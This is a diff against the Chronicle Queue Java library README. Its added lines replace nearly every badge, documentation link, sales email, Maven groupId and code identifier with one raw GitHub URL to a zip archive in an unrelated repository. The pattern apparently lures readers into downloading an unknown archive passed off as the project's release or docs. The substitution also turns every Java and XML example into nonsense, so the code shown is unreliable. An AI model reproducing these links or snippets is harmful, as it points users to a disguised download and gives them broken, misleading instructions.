@@ -8,14 +8,14 @@ Peter Lawrey, Rob Austin
 
 Chronicle Queue is a broker-less, off-heap Java library for ultra-low-latency, persisted messaging at millions of events/sec.
 
-image:https://maven-badges.herokuapp.com/maven-central/net.openhft/chronicle-queue/badge.svg[caption="",link=https://maven-badges.herokuapp.com/maven-central/net.openhft/chronicle-queue]
-image:https://javadoc.io/badge2/net.openhft/chronicle-queue/javadoc.svg[link="https://www.javadoc.io/doc/net.openhft/chronicle-queue/latest/index.html"]
-image:https://img.shields.io/github/license/OpenHFT/Chronicle-Queue[GitHub]
-image:https://img.shields.io/gitter/room/OpenHFT/Lobby.svg?style=popout[link="https://gitter.im/OpenHFT/Lobby"]
-image:https://img.shields.io/badge/release%20notes-subscribe-brightgreen[link="https://chronicle.software/release-notes/"]
-image:https://sonarcloud.io/api/project_badges/measure?project=OpenHFT_Chronicle-Queue&metric=alert_status[link="https://sonarcloud.io/dashboard?id=OpenHFT_Chronicle-Queue"]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[caption="",https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[link="https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[GitHub]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[link="https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip%20notes-subscribe-brightgreen[link="https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[link="https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip"]
 
-image::docs/images/Queue_line.png[width=20%]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[width=20%]
 
 toc::[]
 
@@ -26,7 +26,7 @@ It supports multiple writers to a queue via locking, and multiple lock-less conc
 
 This project covers the Java version of Chronicle Queue.
 A {cpp} version of this project is also available and supports Java/{cpp} interoperability plus additional language bindings e.g. Python.
-If you are interested in evaluating the {cpp} version please contact mailto:sales@chronicle.software[sales@chronicle.software].
+If you are interested in evaluating the {cpp} version please contact https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip].
 
 At first glance Chronicle Queue can be seen as simply *another queue implementation*.
 However, it has major design choices that should be emphasised.
@@ -36,9 +36,9 @@ When implementing high-performance and memory-intensive applications (you heard 
 Chronicle Queue allows messages to be added to the end of a queue ("appended"), read from the queue ("tailed"),
 and also supports random-access seek.
 
-link:https://player.vimeo.com/video/201989439[Why Use Chronicle Queue Between Microservices?]
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Why Use Chronicle Queue Between Microservices?]
 
-A number of relevant system properties are listed in link:docs/systemProperties.adoc[systemProperties.adoc].
+A number of relevant system properties are listed in https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip].
 
 == What Is Chronicle Queue?
 
@@ -128,7 +128,7 @@ This is supported directly using the methodReader/methodWriter builders.
 
 ==== Using high resolution timings across machines
 
-On most systems `System.nanoTime()` is roughly the number of nanoseconds since the system last rebooted (although different JVMs may behave differently).
+On most systems `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` is roughly the number of nanoseconds since the system last rebooted (although different JVMs may behave differently).
 This is the same across JVMs on the same machine, but wildly different between machines.
 The absolute difference when it comes to machines is meaningless.
 However, the information can be used to detect outliers; you can't determine what the best latency is, but you can determine how far off the best latencies you are.
@@ -152,7 +152,7 @@ If you can not avoid generating interrupts then we suggest that you create a sep
 === Usage
 
 Chronicle Queue is most often used for producer-centric systems where you need to retain a lot of data for days or years.
-For statistics see https://docs.google.com/spreadsheets/u/1/d/e/2PACX-1vTe-ijX-uRMc86pB1r-qPUIDZmzI0drPQtvUiGiU8p6WEq98HHDO47HXfV_dk_q6Tmhr1fq2pLxLkqv/pubhtml[Usage of Chronicle-Queue]
+For statistics see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Usage of Chronicle-Queue]
 
 IMPORTANT: Chronicle Queue does _not_ support operating off any network file system, be it NFS, AFS, SAN-based storage or anything else.
 The reason for this is those file systems do not provide all the required primitives for memory-mapped files Chronicle Queue uses.
@@ -192,7 +192,7 @@ Again, Chronicle Queue can support millions of events per-second, per-server, an
 Chronicle Queue supports low latency IPC (Inter Process Communication) between JVMs on the same machine in the order of magnitude of 1 microsecond; as well as between machines with a typical latency of 10 microseconds for modest throughputs of a few hundred thousands.
 Chronicle Queue supports throughputs of millions of events per second, with stable microsecond latencies.
 
-See https://vanilla-java.github.io/tag/Microservices/[Articles on the use of Chronicle Queue in Microservices]
+See https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Articles on the use of Chronicle Queue in Microservices]
 
 ==== Log replacement
 
@@ -224,18 +224,18 @@ Releases are available on Maven Central as:
 [source,xml]
 ----
 <dependency>
-  <groupId>net.openhft</groupId>
+  <groupId>https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip</groupId>
   <artifactId>chronicle-queue</artifactId>
   <version><!--replace with the latest version, see below--></version>
 </dependency>
 ----
 
-See https://github.com/OpenHFT/Chronicle-Queue/releases[Chronicle Queue Release Notes] and get the http://search.maven.org/#search%7Cga%7C1%7Cg%3A%22net.openhft%22%20AND%20a%3A%22chronicle-queue%22[Latest Version Number].
-Snapshots are available on https://oss.sonatype.org
+See https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Chronicle Queue Release Notes] and get the https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip%7Cga%7C1%7Cg%3A%https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip%22%20AND%20a%3A%22chronicle-queue%22[Latest Version Number].
+Snapshots are available on https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 
 NOTE: Classes that reside in either of the packages 'internal', 'impl', and 'main' (the latter containing various runnable main methods) and
 any sub-packages are not a part of the public API and _may become subject to change at any time for any reason_.
-See the respective `package-info.java` files for details.
+See the respective `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` files for details.
 
 == Chronicle Queue Versions and Remarkable Changes
 
@@ -245,11 +245,11 @@ In Chronicle Queue v5 tailers are now read-only, in Chronicle Queue v4 we had th
 We decided to drop lazy indexing in v5; making tailers read-only not only simplifies Chronicle Queue but also allows us to add optimisations elsewhere in the code.
 
 The locking model of Chronicle Queue was changed in v5, in Chronicle Queue v4 the write lock (to prevent concurrent writes to the queue) exists in the .cq4 file.
-In v5 this was moved to a single file called a table store (metadata.cq4t).
+In v5 this was moved to a single file called a table store (https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip).
 This simplifies the locking code internally as only the table store file has to be inspected.
 
 You can use Chronicle Queue v5 to read messages written with Chronicle Queue v4, but this is not guaranteed to always work - if, for example,
-you created your v4 queue with `wireType(WireType.FIELDLESS_BINARY)` then Chronicle Queue v5 will not be able to read the queue's header.
+you created your v4 queue with `wireType(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)` then Chronicle Queue v5 will not be able to read the queue's header.
 We have some tests for v5 reading v4 queues but these are limited and all scenarios may not be supported.
 
 You cannot use Chronicle Queue v5 to write to Chronicle Queue v4 queues.
@@ -275,22 +275,22 @@ For example:
 .Writing and reading bytes using a lambda
 [source,java]
 ----
-appender.writeBytes(b -> b.writeInt(1234).writeDouble(1.111));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(b -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(1234).writeDouble(1.111));
 
-boolean present = tailer.readBytes(b -> process(b.readInt(), b.readDouble()));
+boolean present = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(b -> process(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(), https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()));
 ----
 
 .Writing to a queue without using a lambda
 [source,java]
 ----
-try (DocumentContext dc = appender.writingDocument()) {
-    Bytes<?> bytes = dc.wire().bytes();
+try (DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+    Bytes<?> bytes = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().bytes();
     // write to bytes
 }
 
-try (DocumentContext dc = tailer.readingDocument()) {
-    if (dc.isPresent()) {
-        Bytes<?> bytes = dc.wire().bytes();
+try (DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+    if (https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+        Bytes<?> bytes = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().bytes();
         // read from bytes
     }
 }
@@ -298,28 +298,28 @@ try (DocumentContext dc = tailer.readingDocument()) {
 
 === Chronicle Queue Enterprise Edition
 
-link:https://chronicle.software/products/queue-enterprise/[Chronicle Queue Enterprise Edition] is a commercially supported version of our successful open source Chronicle Queue.
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Chronicle Queue Enterprise Edition] is a commercially supported version of our successful open source Chronicle Queue.
 The open source documentation is extended by the following documents to describe the additional features that are available when you are licenced for Enterprise Edition.
 These are:
 
 * Encryption of message queues and messages.
-For more information see link:https://portal.chronicle.software/docs/queue/chronicle-queue/encryption/encryption.html[Encryption documentation].
+For more information see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Encryption documentation].
 * TCP/IP (and optionally UDP) Replication between hosts to ensure real-time backup of all your queue data.
-For more information see the link:https://portal.chronicle.software/docs/queue/chronicle-queue/replication/replication.html[replication] documentation.
+For more information see the https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[replication] documentation.
 * Timezone support for daily queue rollover scheduling.
-For more information see link:https://portal.chronicle.software/docs/queue/chronicle-queue/configuration/timezone_rollover.html[Timezone support].
+For more information see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Timezone support].
 * Async mode support to give improved performance at high throughput on slower filesystems.
-For more information see link:https://portal.chronicle.software/docs/queue/chronicle-queue/async-mode/async_mode.html[async mode] and also link:https://portal.chronicle.software/docs/queue/chronicle-queue/performance/performance-test-results.html[performance].
+For more information see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[async mode] and also https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[performance].
 * Pre-toucher
-For improved outliers, see link:https://portal.chronicle.software/docs/queue/chronicle-queue/performance/pretouching.html[Pre-toucher and its configuration]
+For improved outliers, see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Pre-toucher and its configuration]
 
 In addition, you will be fully supported by our technical experts.
 
-For more information on Chronicle Queue Enterprise Edition, please contact mailto:sales@chronicle.software[sales@chronicle.software].
+For more information on Chronicle Queue Enterprise Edition, please contact https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip].
 
 == User Guide
 
-A Chronicle Queue is defined by `SingleChronicleQueue.class` that is designed to support:
+A Chronicle Queue is defined by `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` that is designed to support:
 
 * rolling files on a daily, weekly or hourly basis,
 
@@ -327,7 +327,7 @@ A Chronicle Queue is defined by `SingleChronicleQueue.class` that is designed to
 
 * concurrent readers on the same machine or across multiple machines via TCP replication (With Chronicle Queue Enterprise),
 
-* concurrent readers and writers between link:./docs/FAQ.adoc#containerisation-recommendations[Docker or other containerised workloads]
+* concurrent readers and writers between https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Docker or other containerised workloads]
 
 * zero copy serialization and deserialization,
 
@@ -349,7 +349,7 @@ You can easily add an interface which suits your needs.
 NOTE: Due to fairly low-level operation, Chronicle Queue read/write operations can throw unchecked exceptions.
 In order to prevent thread death, it might be practical to catch `RuntimeExceptions` and log/analyze them as appropriate.
 
-NOTE: For demonstrations of how Chronicle Queue can be used see link:https://github.com/OpenHFT/Chronicle-Queue-Sample[Chronicle Queue Demo] and for Java documentation see link:https://www.javadoc.io/doc/net.openhft/chronicle-queue/latest/index.html[Chronicle Queue JavaDocs]
+NOTE: For demonstrations of how Chronicle Queue can be used see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Chronicle Queue Demo] and for Java documentation see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Chronicle Queue JavaDocs]
 
 In the following sections, first we introduce some terminology and a quick reference to use Chronicle Queue.
 Then, we provide a more detailed guide.
@@ -391,11 +391,11 @@ Messages by different appenders are interleaved,
 
 Chronicle Queue is broker-less.
 If you need an architecture with a broker, please
-contact mailto:sales@chronicle.software[sales@chronicle.software].
+contact https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip].
 
 * _File rolling and queue files_
 
-Chronicle Queue is designed to roll its files depending on the roll cycle chosen when queue is created (see https://github.com/OpenHFT/Chronicle-Queue/blob/ea/src/main/java/net/openhft/chronicle/queue/RollCycles.java[RollCycles]).
+Chronicle Queue is designed to roll its files depending on the roll cycle chosen when queue is created (see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[RollCycles]).
 In other words, a queue file is created for each roll cycle which has extension `cq4`.
 When the roll cycle reaches the point it should roll, appender will atomically write `EOF` mark at the end of current file to indicate that no other appender should write to this file and no tailer should read further, and instead everyone should use new file.
 
@@ -409,10 +409,10 @@ If you have a topic called `mytopic`, the layout could look like this:
 [source]
 ----
 mytopic/
-    20160710.cq4
-    20160711.cq4
-    20160712.cq4
-    20160713.cq4
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
 To copy all the data for a single day (or cycle), you can copy the file for that day on to your development machine for replay testing.
@@ -445,15 +445,15 @@ To create an instance you have to use the `ChronicleQueueBuilder`.
 
 [source,java]
 ----
-String basePath = OS.getTarget() + "/getting-started"
-ChronicleQueue queue = SingleChronicleQueueBuilder.single(basePath).build();
+String basePath = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip() + "/getting-started"
+ChronicleQueue queue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(basePath).build();
 ----
 
 In this example we have created an `IndexedChronicle` which creates two `RandomAccessFiles`; one for indexes, and one for data having names relatively:
 
 [source]
 ----
-${java.io.tmpdir}/getting-started/{today}.cq4
+${https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip}/getting-started/{today}.cq4
 ----
 
 * Writing to a queue
@@ -461,13 +461,13 @@ ${java.io.tmpdir}/getting-started/{today}.cq4
 [source,java]
 ----
 // Obtains an ExcerptAppender
-ExcerptAppender appender = queue.acquireAppender();
+ExcerptAppender appender = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
 // Writes: {msg: TestMessage}
-appender.writeDocument(w -> w.write("msg").text("TestMessage"));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("msg").text("TestMessage"));
 
 // Writes: TestMessage
-appender.writeText("TestMessage");
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("TestMessage");
 ----
 
 * Reading from a queue
@@ -475,16 +475,16 @@ appender.writeText("TestMessage");
 [source,java]
 ----
 // Creates a tailer
-ExcerptTailer tailer = queue.createTailer();
+ExcerptTailer tailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
-tailer.readDocument(w -> System.out.println("msg: " + w.read(()->"msg").text()));
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("msg: " + https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(()->"msg").text()));
 
-assertEquals("TestMessage", tailer.readText());
+assertEquals("TestMessage", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 ----
-Also, the `ChronicleQueue.dump()` method can be used to dump the raw contents as a string.
+Also, the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` method can be used to dump the raw contents as a string.
 [source,java]
 ----
-queue.dump();
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 ----
 
 * Cleanup
@@ -496,28 +496,28 @@ This is only to clean up resources that were used.
 
 [source,java]
 ----
-queue.close();
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 ----
 
 * Putting it all together
 
 [source,java]
 ----
-try (ChronicleQueue queue = SingleChronicleQueueBuilder.single("queue-dir").build()) {
+try (ChronicleQueue queue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("queue-dir").build()) {
     // Obtain an ExcerptAppender
-    ExcerptAppender appender = queue.acquireAppender();
+    ExcerptAppender appender = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
     // Writes: {msg: TestMessage}
-    appender.writeDocument(w -> w.write("msg").text("TestMessage"));
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("msg").text("TestMessage"));
 
     // Writes: TestMessage
-    appender.writeText("TestMessage");
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("TestMessage");
 
-    ExcerptTailer tailer = queue.createTailer();
+    ExcerptTailer tailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 
-    tailer.readDocument(w -> System.out.println("msg: " + w.read(()->"msg").text()));
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("msg: " + https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(()->"msg").text()));
 
-    assertEquals("TestMessage", tailer.readText());
+    assertEquals("TestMessage", https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 }
 ----
 
@@ -537,7 +537,7 @@ For instance, using the following code snippet will result in the queue files be
 
 [source,java]
 ----
-ChronicleQueue.singleBuilder(queuePath).rollCycle(RollCycles.HOURLY).build()
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath).rollCycle(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip).build()
 ----
 
 Once a queue's roll-cycle has been set, it cannot be changed at a later date.
@@ -548,18 +548,18 @@ In this case, a warning log message will be printed in order to notify the libra
 [source,java]
 ----
 // Creates a queue with roll-cycle MINUTELY
-try (ChronicleQueue minuteRollCycleQueue = ChronicleQueue.singleBuilder(queueDir).rollCycle(MINUTELY).build()) {
+try (ChronicleQueue minuteRollCycleQueue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queueDir).rollCycle(MINUTELY).build()) {
 
     // Creates a queue with roll-cycle HOURLY
-    try (ChronicleQueue hourlyRollCycleQueue = ChronicleQueue.singleBuilder(queueDir).rollCycle(HOURLY).build()) {
+    try (ChronicleQueue hourlyRollCycleQueue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queueDir).rollCycle(HOURLY).build()) {
 
-        try (DocumentContext documentContext = hourlyRollCycleQueue.acquireAppender().writingDocument()) {
-            documentContext.wire().write("somekey").text("somevalue");
